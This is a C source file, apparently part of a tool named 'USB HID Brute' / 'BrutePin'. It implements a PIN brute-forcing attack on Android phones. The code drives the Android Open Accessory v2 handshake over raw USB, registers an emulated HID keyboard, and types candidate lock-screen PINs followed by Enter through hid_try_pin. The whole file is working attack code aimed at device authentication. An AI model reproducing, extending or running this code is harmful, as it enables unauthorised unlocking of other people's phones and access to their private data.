#define _GNU_SOURCE
#include "usb_hid_brute.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/usbdevice_fs.h>
#include <linux/usb/ch9.h>
#include <errno.h>
#include <time.h>

/*
 * Android Open Accessory (AOA) protocol v2
 * Allows USB host to send HID keyboard events to Android device
 *
 * This works WITHOUT ADB — pure USB protocol.
 */

/* AOA ioctl codes */
#define ACCESSORY_GET_PROTOCOL     _IOR('M', 51, int)
#define ACCESSORY_SEND_STRING      _IOW('M', 52, const char*)
#define ACCESSORY_START            _IO('M', 53)
#define ACCESSORY_REGISTER_HID     _IOW('M', 54, int)
#define ACCESSORY_UNREGISTER_HID   _IOW('M', 55, int)
#define ACCESSORY_SET_HID_REPORT_DESC _IOW('M', 56, unsigned int)
#define ACCESSORY_SEND_HID_EVENT   _IOW('M', 57, unsigned int)

#define AOA_VID 0x18D1
#define AOA_PID_ACCESSORY 0x2D00
#define AOA_PID_ACCESSORY_ADB 0x2D01

/* HID Keyboard report descriptor for 6-key rollover */
static const unsigned char hid_report_desc[] = {
    0x05, 0x01,  /* Usage Page (Generic Desktop) */
    0x09, 0x06,  /* Usage (Keyboard) */
    0xA1, 0x01,  /* Collection (Application) */
    0x05, 0x07,  /* Usage Page (Keyboard) */
    0x19, 0xE0,  /* Usage Minimum (224) */
    0x29, 0xE7,  /* Usage Maximum (231) */
    0x15, 0x00,  /* Logical Minimum (0) */
    0x25, 0x01,  /* Logical Maximum (1) */
    0x75, 0x01,  /* Report Size (1) */
    0x95, 0x08,  /* Report Count (8) */
    0x81, 0x02,  /* Input (Data,Var,Abs) */
    0x95, 0x01,  /* Report Count (1) */
    0x75, 0x08,  /* Report Size (8) */
    0x81, 0x01,  /* Input (Const) */
    0x95, 0x05,  /* Report Count (5) */
    0x75, 0x01,  /* Report Size (1) */
    0x05, 0x08,  /* Usage Page (LEDs) */
    0x19, 0x01,  /* Usage Minimum (1) */
    0x29, 0x05,  /* Usage Maximum (5) */
    0x91, 0x02,  /* Output (Data,Var,Abs) */
    0x95, 0x01,  /* Report Count (1) */
    0x75, 0x03,  /* Report Size (3) */
    0x91, 0x01,  /* Output (Const) */
    0x95, 0x06,  /* Report Count (6) */
    0x75, 0x08,  /* Report Size (8) */
    0x15, 0x00,  /* Logical Minimum (0) */
    0x25, 0x65,  /* Logical Maximum (101) */
    0x05, 0x07,  /* Usage Page (Keyboard) */
    0x19, 0x00,  /* Usage Minimum (0) */
    0x29, 0x65,  /* Usage Maximum (101) */
    0x81, 0x00,  /* Input (Data,Array) */
    0xC0         /* End Collection */
};

/* Open USB device and get fd */
static int open_usb_dev(int bus, int dev) {
    char path[64];
    snprintf(path, sizeof(path), "/dev/bus/usb/%03d/%03d", bus, dev);
    int fd = open(path, O_RDWR);
    if (fd < 0) {
        snprintf(path, sizeof(path), "/dev/bus/usb/%03d/%03d", bus, dev);
        fd = open(path, O_RDWR);
    }
    return fd;
}

unsigned char hid_digit_to_keycode(char digit) {
    switch (digit) {
        case '0': return HID_KEY_0;
        case '1': return HID_KEY_1;
        case '2': return HID_KEY_2;
        case '3': return HID_KEY_3;
        case '4': return HID_KEY_4;
        case '5': return HID_KEY_5;
        case '6': return HID_KEY_6;
        case '7': return HID_KEY_7;
        case '8': return HID_KEY_8;
        case '9': return HID_KEY_9;
        default: return 0;
    }
}

const char* hid_last_error(UsbHidBrute *hid) {
    return hid ? hid->last_error : "Unknown error";
}

int hid_init(UsbHidBrute *hid, int bus, int dev) {
    memset(hid, 0, sizeof(*hid));
    hid->bus = bus;
    hid->dev = dev;
    hid->timeout = 1000;
    hid->fd = -1;

    hid->fd = open_usb_dev(bus, dev);
    if (hid->fd < 0) {
        snprintf(hid->last_error, sizeof(hid->last_error),
                 "Cannot open USB device %03d:%03d: %s", bus, dev, strerror(errno));
        return 0;
    }

    return 1;
}

int hid_aoa_handshake(UsbHidBrute *hid) {
    if (hid->fd < 0) {
        snprintf(hid->last_error, sizeof(hid->last_error), "No device open");
        return 0;
    }

    /* Step 1: Get protocol version via USB control transfer */
    struct usbdevfs_ctrltransfer ctrl;
    memset(&ctrl, 0, sizeof(ctrl));
    ctrl.bRequestType = USB_DIR_IN | USB_TYPE_VENDOR;
    ctrl.bRequest = 51;  /* ACCESSORY_GET_PROTOCOL */
    ctrl.wValue = 0;
    ctrl.wIndex = 0;
    ctrl.wLength = sizeof(hid->aoa_version);
    ctrl.data = &hid->aoa_version;
    ctrl.timeout = hid->timeout;
    if (ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl) < 0) {
        snprintf(hid->last_error, sizeof(hid->last_error),
                 "AOA not supported: %s", strerror(errno));
        return 0;
    }

    hid->aoa_supported = 1;

    if (hid->debug)
        printf("[HID] AOA protocol v%d\n", hid->aoa_version);

    if (hid->aoa_version < 2) {
        snprintf(hid->last_error, sizeof(hid->last_error),
                 "AOA v%d < v2 required for HID", hid->aoa_version);
        return 0;
    }

    /* Step 2: Send identification strings */
    const char *strings[] = {
        "BrutePin",           /* manufacturer */
        "USB HID Brute",      /* model name */
        "BruteForce PIN",     /* description */
        "1.0",                /* version */
        "https://github.com", /* URI */
        "00000001"            /* serial */
    };

    /* Step 2: Send identification strings via control transfer */
    ctrl.bRequestType = USB_DIR_OUT | USB_TYPE_VENDOR;
    ctrl.bRequest = 52;  /* ACCESSORY_SEND_STRING */
    ctrl.wValue = 0;
    ctrl.wIndex = 0;      /* manufacturer */
    ctrl.wLength = strlen(strings[0]) + 1;
    ctrl.data = (void*)strings[0];
    ctrl.timeout = hid->timeout;
    if (ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl) < 0) {
        snprintf(hid->last_error, sizeof(hid->last_error),
                 "AOA send string failed: %s", strerror(errno));
        return 0;
    }

    ctrl.wIndex = 1; /* model */
    ctrl.data = (void*)strings[1];
    ctrl.wLength = strlen(strings[1]) + 1;
    ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl);

    ctrl.wIndex = 2; /* description */
    ctrl.data = (void*)strings[2];
    ctrl.wLength = strlen(strings[2]) + 1;
    ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl);

    ctrl.wIndex = 3; /* version */
    ctrl.data = (void*)strings[3];
    ctrl.wLength = strlen(strings[3]) + 1;
    ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl);

    ctrl.wIndex = 4; /* URI */
    ctrl.data = (void*)strings[4];
    ctrl.wLength = strlen(strings[4]) + 1;
    ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl);

    ctrl.wIndex = 5; /* serial */
    ctrl.data = (void*)strings[5];
    ctrl.wLength = strlen(strings[5]) + 1;
    ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl);

    /* Step 3: Start accessory mode */
    ctrl.bRequestType = USB_DIR_OUT | USB_TYPE_VENDOR;
    ctrl.bRequest = 53;  /* ACCESSORY_START */
    ctrl.wValue = 0;
    ctrl.wIndex = 0;
    ctrl.wLength = 0;
    ctrl.data = NULL;
    ctrl.timeout = hid->timeout;
    if (ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl) < 0) {
        snprintf(hid->last_error, sizeof(hid->last_error),
                 "AOA start failed: %s", strerror(errno));
        return 0;
    }

    /* Device will now disconnect and reconnect with accessory PID */
    close(hid->fd);
    hid->fd = -1;

    if (hid->debug)
        printf("[HID] AOA mode activated, device will re-enumerate.\n");

    return 1;
}

int hid_aoa_register_hid(UsbHidBrute *hid) {
    if (hid->fd < 0) {
        snprintf(hid->last_error, sizeof(hid->last_error), "No device open");
        return 0;
    }

    struct usbdevfs_ctrltransfer ctrl;

    /* Register HID keyboard (argument = report descriptor length) */
    memset(&ctrl, 0, sizeof(ctrl));
    ctrl.bRequestType = USB_DIR_OUT | USB_TYPE_VENDOR;
    ctrl.bRequest = 54;  /* ACCESSORY_REGISTER_HID */
    ctrl.wValue = 0;
    ctrl.wIndex = sizeof(hid_report_desc); /* HID descriptor length */
    ctrl.wLength = 0;
    ctrl.data = NULL;
    ctrl.timeout = hid->timeout;
    if (ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl) < 0) {
        snprintf(hid->last_error, sizeof(hid->last_error),
                 "AOA register HID failed: %s", strerror(errno));
        return 0;
    }

    /* Set HID report descriptor */
    memset(&ctrl, 0, sizeof(ctrl));
    ctrl.bRequestType = USB_DIR_OUT | USB_TYPE_VENDOR;
    ctrl.bRequest = 56;  /* ACCESSORY_SET_HID_REPORT_DESC */
    ctrl.wValue = 0;
    ctrl.wIndex = 0;      /* HID ID (0 = first registration) */
    ctrl.wLength = sizeof(hid_report_desc);
    ctrl.data = (void*)hid_report_desc;
    ctrl.timeout = hid->timeout;
    if (ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl) < 0) {
        snprintf(hid->last_error, sizeof(hid->last_error),
                 "AOA set report desc failed: %s", strerror(errno));
        return 0;
    }

    hid->hid_ready = 1;
    if (hid->debug)
        printf("[HID] HID keyboard registered\n");

    return 1;
}

int hid_aoa_send_report(UsbHidBrute *hid, unsigned char keycode) {
    if (hid->fd < 0 || !hid->hid_ready) return 0;

    /* HID keyboard report: 8 bytes
       [0] = modifier keys
       [1] = reserved
       [2-7] = keycodes (up to 6 simultaneous keys) */

    /* Key press */
    unsigned char report[8] = {0, 0, keycode, 0, 0, 0, 0, 0};
    /* ACCESSORY_SEND_HID_EVENT takes the report buffer as data pointer.
       We use USBDEVFS_CONTROL to send the HID event control transfer directly. */
    struct usbdevfs_ctrltransfer ctrl;
    memset(&ctrl, 0, sizeof(ctrl));
    ctrl.bRequestType = USB_DIR_OUT | USB_TYPE_VENDOR;
    ctrl.bRequest = 57;  /* ACCESSORY_SEND_HID_EVENT */
    ctrl.wValue = 0;
    ctrl.wIndex = 0;      /* HID ID */
    ctrl.wLength = sizeof(report);
    ctrl.data = report;
    ctrl.timeout = hid->timeout;
    if (ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl) < 0) {
        snprintf(hid->last_error, sizeof(hid->last_error),
                 "AOA send HID failed: %s", strerror(errno));
        return 0;
    }
    usleep(20000);

    /* Key release */
    memset(report, 0, sizeof(report));
    ctrl.data = report;
    ioctl(hid->fd, USBDEVFS_CONTROL, &ctrl);
    usleep(10000);

    return 1;
}

int hid_aoa_send_pin(UsbHidBrute *hid, const char *pin) {
    int len = strlen(pin);
    for (int i = 0; i < len; i++) {
        unsigned char kc = hid_digit_to_keycode(pin[i]);
        if (!hid_aoa_send_report(hid, kc)) return 0;
        usleep(50000);
    }
    return 1;
}

int hid_aoa_send_enter(UsbHidBrute *hid) {
    return hid_aoa_send_report(hid, HID_KEY_ENTER);
}

int hid_try_pin(UsbHidBrute *hid, const char *pin) {
    if (!hid->hid_ready) return 0;
    /* Send PIN + Enter */
    if (!hid_aoa_send_pin(hid, pin)) return 0;
    usleep(50000);
    if (!hid_aoa_send_enter(hid)) return 0;
    return 1;
}

void hid_close(UsbHidBrute *hid) {
    if (hid->fd >= 0) {
        close(hid->fd);
        hid->fd = -1;
    }
}
